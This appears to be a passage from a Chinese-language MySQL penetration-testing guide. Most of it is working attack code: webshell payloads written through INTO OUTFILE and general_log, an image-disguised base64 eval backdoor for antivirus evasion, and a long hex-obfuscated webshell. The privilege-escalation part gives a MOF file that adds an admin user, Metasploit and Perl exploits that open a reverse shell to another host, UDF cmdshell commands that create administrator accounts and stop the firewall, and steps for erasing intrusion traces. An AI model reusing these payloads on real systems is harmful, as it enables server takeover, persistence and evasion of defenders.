<h3 id="使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。"><a href="#使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。" class="headerlink" title="使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。"></a>使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。</h3><h2 id="源代码泄露"><a href="#源代码泄露" class="headerlink" title="源代码泄露"></a>源代码泄露</h2><h3 id="网站源代码备份文件"><a href="#网站源代码备份文件" class="headerlink" title="网站源代码备份文件"></a>网站源代码备份文件</h3><p>一些网站源代码文件中会包含数据库连接文件，通过查看这些文件可以获取数据库账号和密码。一般常见的数据库连接文件为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config.php</span><br><span class="line">web.config</span><br><span class="line">conn.asp</span><br><span class="line">db.php/asp</span><br><span class="line">jdbc.properties</span><br><span class="line">sysconfig.properties</span><br><span class="line">JBOSS_HOME\docs\examples\jca\XXXX-ds</span><br></pre></td></tr></table></figure></p>
<p>以前有一款工具挖掘鸡可以自定义网站等名称对zip/rar/tar/tar.gz/gz/sql等后缀文件进行扫描。</p>
<h3 id="配置备份文件"><a href="#配置备份文件" class="headerlink" title="配置备份文件"></a>配置备份文件</h3><p>使用ultraedit等编辑文件编辑数据库配置文件后，会留下bak文件。</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>本地文件包含漏洞可以包含文件，通过查看文件代码获取数据库配置文件，进而读取数据库用户名和密码。</p>
<h2 id="其它情况"><a href="#其它情况" class="headerlink" title="其它情况"></a>其它情况</h2><p>有些软件会将IP地址、数据库用户名和密码写进程序中，运行程序后，通过cain软件进行嗅探，可以获取数据库密码。另外Mysql客户端管理工具有的管理员会建立连接记录，这些连接记录保存了用户名、密码和连接IP地址或者主机名，通过配置文件或者嗅探可以获取用户名和密码。</p>
<h1 id="Mysql获取webshell"><a href="#Mysql获取webshell" class="headerlink" title="Mysql获取webshell"></a>Mysql获取webshell</h1><h2 id="phpmyadminroot账号获取webshell"><a href="#phpmyadminroot账号获取webshell" class="headerlink" title="phpmyadminroot账号获取webshell"></a>phpmyadminroot账号获取webshell</h2><p>MysqlRoot账号通过phpMyAdmin获取webshell的思路，主要有下面几种方式，以第一二六八种方法较佳，其它可以根据实际情况来进行。</p>
<h3 id="直接读取后门文件"><a href="#直接读取后门文件" class="headerlink" title="直接读取后门文件"></a>直接读取后门文件</h3><p>通过程序报错、phpinfo函数、程序配置表等直接获取网站真实路径，有些网站前期已经被人渗透过，因此在目录下留有后门文件通过load_file直接读取。</p>
<h3 id="直接导出一句话后门"><a href="#直接导出一句话后门" class="headerlink" title="直接导出一句话后门"></a>直接导出一句话后门</h3><p>前提需要知道网站的真实物理路径，例如呼求偶真实路径D:\work\WWW，则可以通过执行以下查询，来获取一句话后门文件cmd.php，访问地址<a href="http://www.somesite.com/cmd.php" target="_blank" rel="noopener">http://www.somesite.com/cmd.php</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php @eval($_POST[antian365]);?&gt;'</span>INTO OUTFILE <span class="string">'D:/work/WWW/antian365.php'</span></span><br></pre></td></tr></table></figure></p>
<h3 id="创建数据库导出一句话后门"><a href="#创建数据库导出一句话后门" class="headerlink" title="创建数据库导出一句话后门"></a>创建数据库导出一句话后门</h3><p>在查询窗口直接执行以下代码即可，跟2.原理类似。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`antian365` (`temp` TEXT NOTNULL );</span><br><span class="line">INSERT INTO `mysql`.`antian365` (`temp` ) VALUES(<span class="string">'&lt;?php @eval($_POST[antian365]);?&gt;'</span>);</span><br><span class="line">SELECT `temp` FROM `antian365` INTO OUTFILE<span class="string">'D:/www/antian365.php'</span>;</span><br><span class="line">DROP TABLE IF EXISTS `antian365`;</span><br></pre></td></tr></table></figure></p>
<h3 id="可执行命令方式"><a href="#可执行命令方式" class="headerlink" title="可执行命令方式"></a>可执行命令方式</h3><p>创建执行命令形式的shell，但前提是对方未关闭系统函数。该方法导出成功后可以直接执行DOS命令，使用方法:<a href="http://www.xxx.com/antian365.php?cmd=(cmd=后面直接执行dos命令)。" target="_blank" rel="noopener">www.xxx.com/antian365.php?cmd=(cmd=后面直接执行dos命令)。</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php echo \'</span>&lt;pre&gt;\<span class="string">';system($_GET[\'</span>cmd\<span class="string">']); echo \'</span>&lt;/pre&gt;\<span class="string">'; ?&gt;'</span> INTO OUTFILE <span class="string">'d:/www/antian365.php'</span></span><br></pre></td></tr></table></figure></p>
<p>另外在linux下可以导出直接执行命令的shell：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">'&lt;? system($_GET[\'</span>c\<span class="string">']); ?&gt;'</span> INTO OUTFILE <span class="string">'/var/www/shell.php'</span>;</span><br></pre></td></tr></table></figure></p>
<p><a href="http://localhost/shell.php?c=cat%20/etc/passwd" target="_blank" rel="noopener">http://localhost/shell.php?c=cat%20/etc/passwd</a></p>
<h3 id="过杀毒软件方式"><a href="#过杀毒软件方式" class="headerlink" title="过杀毒软件方式"></a>过杀毒软件方式</h3><p>通过后台或者存在上传图片的地方，上传图片publicguide.jpg，内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="string">'PD9waHAgQGV2YWwoJF9QT1NUWydhbnRpYW4zNjUnXSk7ZGllKCk7Pz4='</span>;error_reporting(0);@set_time_limit(0);<span class="built_in">eval</span>(<span class="string">"?&gt;"</span>.base64_decode(<span class="variable">$a</span>));?&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后通过图片包含temp.php，导出webshell。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php include '</span>publicguide.jpg<span class="string">' ?&gt;'</span>INTO OUTFILE <span class="string">'D:/work/WWW/antian365.php'</span></span><br></pre></td></tr></table></figure></p>
<p>一句话后门密码：antian365</p>
<h3 id="直接导出加密webshell"><a href="#直接导出加密webshell" class="headerlink" title="直接导出加密webshell"></a>直接导出加密webshell</h3><p>一句话后门文件密码：pp64mqa2x1rnw68，执行以下查询直接导出加密webshell，D:/WEB/IPTEST/22.php，注意在实际过程需要修改D:/WEB/IPTEST/22.php。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&apos;203C3F7068700D0A24784E203D2024784E2E737562737472282269796234327374725F72656C6750383034222C352C36293B0D0A246C766367203D207374725F73706C697428226D756B3961773238776C746371222C36293B0D0A24784E203D2024784E2E73756273747228226C396364706C616365704172424539646B222C342C35293B0D0A246A6C203D2073747269706F732822657078776B6C3766363674666B74222C226A6C22293B0D0A2474203D2024742E737562737472282274514756325957774A63567534222C312C36293B0D0A2465696137203D207472696D28226A386C32776D6C34367265656E22293B0D0A2462203D2024622E73756273747228226B6261736536346B424474394C366E6D222C312C36293B0D0A246967203D207472696D28226233397730676E756C6922293B0D0A2479203D2024792E24784E28227259222C22222C22637259726572596122293B0D0A24797531203D207374725F73706C697428226269316238376D3861306F3678222C32293B0D0A2474203D2024742E24784E282278413678222C22222C2277784136786F4A463922293B0D0A246E64203D2073747269706F7328226E363574383872786E303265646A336630222C226E6422293B0D0A2462203D2024622E24784E282277493339222C22222C225F774933396477493339656322293B0D0A2468387073203D207374725F73706C697428226B6E396A3968346D6877676633666A6970222C33293B0D0A2479203D2024792E7375627374722822687974655F66756E775669535645344A222C322C36293B0D0A24796637203D207374726C656E282275656875343967367467356B6F22293B0D0A2474203D2024742E24784E28226670222C22222C22516670546670314E667022293B0D0A246D39203D207374726C656E282265756C363034636F626B22293B0D0A2462203D2024622E73756273747228226C3057316F64656C413165536E454A222C342C33293B0D0A2468306277203D207472696D28226E33653568306371746F6B76676F6238747822293B0D0A2479203D2024792E24784E28227962222C22222C2263796274696F22293B0D0A24733761203D20727472696D2822617565627963396734743564386B22293B0D0A2474203D2024742E7375627374722822624D73306E4268383355577964222C392C34293B0D0A2464353971203D2073747269706F732822636A7675636B6F79357766336F746561222C226435397122293B0D0A2479203D2024792E73756273747228226E4439487851534C386E6752222C392C31293B0D0A246C31203D207374725F73706C697428226167717130396762716E31222C34293B0D0A2474203D2024742E24784E282277366F34222C22222C2277634477366F345977366F343022293B0D0A247079203D2073747269706F7328226C677938687472727631746333222C22707922293B0D0A2474203D2024742E24784E282265503332222C22222C22625846655033326822293B0D0A2478703364203D2073747269706F732822756B6C306E626E7839677433222C227870336422293B0D0A2474203D2024742E7375627374722822696B4A3030484A4D6E677863222C372C35293B0D0A2464743262203D207374726C656E282265346135616275616A7733766C6369726122293B0D0A2474203D2024742E737562737472282263644E314B78656D35334E776D456838364253222C372C34293B0D0A2475626A203D207374726C656E28227767686A6E6674326F70356B7831633038367422293B0D0A2474203D2024742E73756273747228226D34616F7864756A676E58536B63784C344657635964222C372C36293B0D0A247178203D207374726C656E2822726C71666B6B6674726F3867666B6F37796122293B0D0A2474203D2024742E7375627374722822723779222C312C31293B0D0A246D75203D20727472696D28226E676478777578357671653122293B0D0A246A203D2024792822222C20246228247429293B0D0A24626E6C70203D207374726C656E28227675667930616B316679617622293B0D0A24736468203D207374725F73706C69742822776D6E6A766733633770306D222C34293B0D0A246D62203D206C7472696D28226E353270317067616570656F6B6622293B0D0A2465307077203D20727472696D28227575346D686770356339706E613465677122293B0D0A24756768203D207472696D282272637064336F3977393974696F3922293B0D0A246772636B203D207374726C656E2822783572697835627031786B793722293B0D0A24656F3674203D207374726C656E282264646931683134656375797563376422293B246A28293B0D0A2464766E71203D207374725F73706C6974282270726D36676968613176726F333630346175222C38293B0D0A24756738203D20727472696D28226563387735327375706234767538656F22293B0D0A24726374203D2073747269706F73282268786536776F37657764386D65376474222C2272637422293B0D0A24656B7166203D207374725F73706C69742822707266357930386538666C6666773032356A38222C38293B0D0A24767972203D207374725F73706C69742822756D706A63737266673668356E64366F3435222C39293B0D0A24777266203D20727472696D282266797839396F3739333868377567716822293B0D0A24713134203D207374726C656E2822746334366F73786C3173743169633222293B0D0A66756E6374696F6E206F2820297B2020207D3B0D0A24757366203D207374726C656E2822666C7463707862377466626A736D7422293B0D0A3F3E&apos;) into dumpfile &apos;D:/WEB/IPTEST/22.php&apos;</span><br></pre></td></tr></table></figure></p>
<p>注意：</p>
<p>也可以使用<a href="http://tool.lu/hexstr/网站的代码转换来实现，将需要导出的文件代码复制到网站的字符串中，通过字符串转成十六进制，将十六进制字符串放入unhex函数进行查询即可：" target="_blank" rel="noopener">http://tool.lu/hexstr/网站的代码转换来实现，将需要导出的文件代码复制到网站的字符串中，通过字符串转成十六进制，将十六进制字符串放入unhex函数进行查询即可：</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(<span class="string">'十六进制字符串'</span>) into dumpfile <span class="string">'D:/WEB/shell.php'</span></span><br></pre></td></tr></table></figure></p>
<h3 id="CMS系统获取webshell"><a href="#CMS系统获取webshell" class="headerlink" title="CMS系统获取webshell"></a>CMS系统获取webshell</h3><p>有些情况下无法获取网站的真实路径，则意味着无法直接导出一句话webshell，可以通过CMS系统管理账号登录系统后，寻找漏文件来获取webshell。Discuz！的UC_key可以直接获取webshell。甚至某些系统可以直接上传php文件。下面是一些CMS系统渗透的技巧：</p>
<p>（1）dedecms系统的密码有直接md5，也有20位的密码，如果是20位的密码则需要去掉密码中的前3位和最后1位，然后对剩余的值进行md5解密即可；</p>
<p>（2）phpcms v9版本的密码需要加salt进行破解，需要选择破解算法md5(md5($pass).$salt)进行破解。</p>
<p>（3）Discuz！论坛帐号保存在ucenter_members（Discuz7.X及以上版本）或者cdb_members（discuz6.x版本）表中，其破解需要带salt进行，其破解时是使用password:salt进行，例如a0513df9929afc972f024fa4e586e829:399793。</p>
<h3 id="general-log-file获取webshell"><a href="#general-log-file获取webshell" class="headerlink" title="general_log_file获取webshell"></a>general_log_file获取webshell</h3><p>（1）查看genera文件配置情况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like <span class="string">"%genera%"</span>;</span><br></pre></td></tr></table></figure></p>
<p>（2）关闭general_log<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global general_log=off;</span><br></pre></td></tr></table></figure></p>
<p>（3）通过general_log选项来获取webshell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global general_log=<span class="string">'on'</span>;</span><br><span class="line">SET global general_log_file=<span class="string">'D:/phpStudy/WWW/cmd.php'</span>;</span><br></pre></td></tr></table></figure></p>
<p>在查询中执行语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure></p>
<p>Shell为cmd.php，一句话后门，密码为cmd。</p>
<h2 id="sqlmap注入点获取webshell"><a href="#sqlmap注入点获取webshell" class="headerlink" title="sqlmap注入点获取webshell"></a>sqlmap注入点获取webshell</h2><p>sqlmap注入点获取webshell的前提是具备写权限，一般是root账号，通过执行命令来获取：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u url--os-shell </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>['c']);?&gt;"</span> &gt;/data/www/1.php</span><br></pre></td></tr></table></figure></p>
<h1 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h1><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><h3 id="Webshell上传mof文件提权"><a href="#Webshell上传mof文件提权" class="headerlink" title="Webshell上传mof文件提权"></a>Webshell上传mof文件提权</h3><p>MySQL Root权限MOF方法提权是来自国外Kingcope大牛发布的MySQL Scanner &amp; MySQL Server for Windows Remote SYSTEM Level Exploit(<a href="https://www.exploit-db.com/exploits/23083/)，简称mysql远程提权0day" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/23083/)，简称mysql远程提权0day</a>(MySQL Windows Remote System Level Exploit (Stuxnet technique) 0day)。Windows 管理规范 (WMI) 提供了以下三种方法编译到 WMI 存储库的托管对象格式 (MOF) 文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方法1：运行 MOF 文件指定为命令行参数 Mofcomp.exe 文件。</span><br><span class="line">方法2：使用 IMofCompiler 接口和 $ CompileFile 方法。</span><br><span class="line">方法3：拖放到 %SystemRoot%\System32\Wbem\MOF 文件夹的 MOF 文件。</span><br></pre></td></tr></table></figure></p>
<p>Microsoft建议您到存储库编译MOF文件使用前两种方法。也就是运行Mofcomp.exe文件，或使用IMofCompiler::CompileFile方法。第三种方法仅为向后兼容性与早期版本的WMI提供，并因为此功能可能不会提供在将来的版本后，不应使用。注意使用MOF方法提权的前提是当前Root帐号可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下，否则会失败！</p>
<p>该漏洞的利用前提条件是必须具备mysql的root权限，在Kingcope公布的0day中公布了一个pl利用脚本。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl mysql_win_remote.pl192.168.2.100 root<span class="string">""</span>192.168.2.150 5555</span><br></pre></td></tr></table></figure></p>
<p>192.168.2.100为mysql数据库所在服务器，mysql口令为空，反弹到192.168.2.150的5555端口上。</p>
<h3 id="生成nullevt-mof文件"><a href="#生成nullevt-mof文件" class="headerlink" title="生成nullevt.mof文件"></a>生成nullevt.mof文件</h3><p>将以下代码保存为nullevt.mof文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription") </span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line"> &#123; </span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>; </span><br><span class="line">Name  = <span class="string">"filtP2"</span>;     </span><br><span class="line">    Query = <span class="string">"Select \ From __InstanceModificationEvent "</span>      </span><br><span class="line">            <span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span>      </span><br><span class="line">             <span class="string">"And TargetInstance.Second = 5"</span>;      </span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;      </span><br><span class="line">&#125;;      </span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span>      </span><br><span class="line">&#123;      </span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>;      </span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;      </span><br><span class="line">ScriptText =      </span><br><span class="line">    <span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add"</span>)<span class="string">"; </span></span><br><span class="line"><span class="string">&#125;; </span></span><br><span class="line"><span class="string">instance of __FilterToConsumerBinding</span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string">    Consumer   = <span class="variable">$Consumer</span>; </span></span><br><span class="line"><span class="string">    Filter = <span class="variable">$EventFilter</span>; </span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="通过Mysql查询将文件导入"><a href="#通过Mysql查询将文件导入" class="headerlink" title="通过Mysql查询将文件导入"></a>通过Mysql查询将文件导入</h3><p>执行以下查询语句，将上面生成的nullevt.mof导入到c:\windows\system32\wbem\mof\目录下在windows7中默认是拒绝<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selectload_file(<span class="string">'C:\\RECYCLER\\nullevt.mof'</span>) into dumpfile <span class="string">'c:/windows/system32/wbem/mof/nullevt.mof'</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="Msf直接mof提权"><a href="#Msf直接mof提权" class="headerlink" title="Msf直接mof提权"></a>Msf直接mof提权</h2><p>Msf下的exploit/windows/mysql/mysql_mof模块提供了直接Mof提权，不过该漏洞成功跟操作系统权限和Mysql数据库版本有关，执行成功后会直接反弹shell到meterpreter。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.157.1 //设置需要提权的远程主机IP地址</span><br><span class="line"><span class="built_in">set</span> rport 3306 //设置mysql的远程端口</span><br><span class="line"><span class="built_in">set</span> password root //设置mysql数据库root密码</span><br><span class="line"><span class="built_in">set</span> username root //设置mysql用户名</span><br><span class="line">options //查看设置</span><br><span class="line">run 0</span><br></pre></td></tr></table></figure></p>
<p>技巧：</p>
<p>要是能够通过网页连接管理（phpmyadmin），则可以修改host为%并刷新权限后，则可以通过msf等工具远程连接数据库。默认root等账号不允许远程连接，除非管理员或者数据库用户自己设置。</p>
<h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p>本地登入mysql，更改 mysql数据库里的 user 表里的 host项，将localhost改为%<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user <span class="built_in">set</span> host = <span class="string">'%'</span> <span class="built_in">where</span> user = <span class="string">'root'</span>;</span><br><span class="line">FLUSH PRIVILEGES ;</span><br><span class="line">select host, user from user;</span><br></pre></td></tr></table></figure></p>
<h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p>直接授权(推荐)</p>
<p>从任何主机上使用root用户，密码：youpassword（你的root密码）连接到mysql服务器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysql -u root -proot</span></span><br><span class="line">GRANT ALL PRIVILEGES ON . TO <span class="string">'root'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'youpassword'</span> WITH GRANT OPTION;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure></p>
<p>推荐重新增加一个用户，在实际测试过程中发现很多服务器使用root配置了多个地址，修改后可能会影响实际系统的运行。在实际测试过程中因此建议新增一个用户，授权所有权限，而不是直接更改root配置。</p>
<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限，其利用条件是目标系统是Windows(Win2000,XP,Win2003)；拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数,有root账号密码Windows下UDF提权对于Windows2008以下服务器比较适用，也即针对Windows2000、Windows2003的成功率较高。</p>
<h3 id="UDF提权条件"><a href="#UDF提权条件" class="headerlink" title="UDF提权条件"></a>UDF提权条件</h3><p>（1）Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p>
<p>（2）Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p>
<p>（3）掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。</p>
<p>（4）可以将udf.dll写入到相应目录的权限。</p>
<h3 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h3><p>（1）获取数据库版本、数据位置以及插件位置等信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select version();//获取数据库版本</span><br><span class="line">select user();//获取数据库用户</span><br><span class="line">select @@basedir ;//获取安装目录</span><br><span class="line">show variables like <span class="string">'%plugins%'</span>;  //寻找mysql安装路径</span><br></pre></td></tr></table></figure></p>
<p>（2）导出路径<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Winnt\udf.dll    Windows 2000</span><br><span class="line">C:\Windows\udf.dll   Windows2003（有的系统被转义，需要改为C:Windowsudf.dll）</span><br></pre></td></tr></table></figure></p>
<p>MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的libplugin文件夹下才能创建自定义函数。该目录默认是不在安装目录下创建libplugin文件夹，然后将udf.dll文件导出到该目录即可。<br>在某些情况下，我们会遇到Can’t open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，<br>网上大牛发现利用NTFS ADS流来创建文件夹的方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;  //查找到mysql的目录</span><br><span class="line">select <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'</span>;   //利用NTFS ADS创建lib目录</span><br><span class="line">select <span class="string">'intodumpfile'</span>C:\\ProgramFiles\\MySQL\\MySQLServer5.1\\lib\\plugin::<span class="variable">$INDEX_ALLOCATION</span><span class="string">';//利用NTFS ADS创建plugin目录</span></span><br></pre></td></tr></table></figure></p>
<p>执行成功以后就会plugin目录，然后再进行导出udf.dll即可。</p>
<p>（3）创建cmdshell 函数，该函数叫什么名字在后续中则使用该函数进行查询：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">function</span> cmdshell returns string soname ‘lib_mysqludf_sys.dll’;</span><br></pre></td></tr></table></figure></p>
<p>（4）执行命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(‘whoami’);</span><br></pre></td></tr></table></figure></p>
<p>一般情况下不会出现创建不成功哦。连不上3389可以先停止windows防火墙和筛选<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(‘net stop policyagent’);</span><br><span class="line">select sys_eval(‘net stop sharedaccess’);</span><br></pre></td></tr></table></figure></p>
<p>udf.dll下常见函数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell  执行cmd;</span><br><span class="line">downloader  下载者,到网上下载指定文件并保存到指定目录;</span><br><span class="line">open3389    通用开3389终端服务,可指定端口(不改端口无需重启);</span><br><span class="line">backshell   反弹Shell;</span><br><span class="line">ProcessView 枚举系统进程;</span><br><span class="line">KillProcess 终止指定进程;</span><br><span class="line">regread     读注册表;</span><br><span class="line">regwrite    写注册表;</span><br><span class="line">shut        关机,注销,重启;</span><br><span class="line">about       说明与帮助函数;</span><br></pre></td></tr></table></figure></p>
<p>具体用户示例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(<span class="string">'net user iis_user 123!@#abcABC /add'</span>);</span><br><span class="line">select cmdshell(<span class="string">'net localgroup administrators iis_user /add'</span>);</span><br><span class="line">select cmdshell(<span class="string">'regedit /s d:web3389.reg'</span>);</span><br><span class="line">select cmdshell(<span class="string">'netstat -an'</span>);</span><br></pre></td></tr></table></figure></p>
<p>（5）清除痕迹<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop <span class="keyword">function</span> cmdshell;//将函数删除</span><br></pre></td></tr></table></figure></p>
<p>删除udf.dll文件以及其它相关入侵文件及日志。</p>
<p>（6）常见错误<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure></p>
<p>在my.ini或者mysql.cnf文件中注销 (使用#号) 包含secure_file_priv的行(SHOW VARIABLES LIKE “secure_file_priv”)。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1123 - Can<span class="string">'t initialize function '</span>backshell<span class="string">'; UDFs are unavailable with the --skip-grant-tables option</span></span><br></pre></td></tr></table></figure></p>
<p>需要将my.ini中的skip-grant-tables选项去掉。</p>
<h3 id="webshell下udf提权"><a href="#webshell下udf提权" class="headerlink" title="webshell下udf提权"></a>webshell下udf提权</h3><p>通过集成udf提权的webshell输入数据库用户名及密码以及数据库服务器地址或者IP通过连接后导出进行提权。</p>
<h3 id="Mysql提权综合利用工具"><a href="#Mysql提权综合利用工具" class="headerlink" title="Mysql提权综合利用工具"></a>Mysql提权综合利用工具</h3><p>v5est0r 写了一个Mysql提权综合利用工具，详细情况请参考其代码共享网站：</p>
<p><a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">https://github.com/v5est0r/Python_FuckMySQL</a><br>其主要功能有：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）自动导出你的backdoor和mof文件</span><br><span class="line">（2）自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权</span><br><span class="line">（3）导出LPK.dll文件，劫持系统目录提权</span><br><span class="line">（4）写启动项提权</span><br></pre></td></tr></table></figure></p>
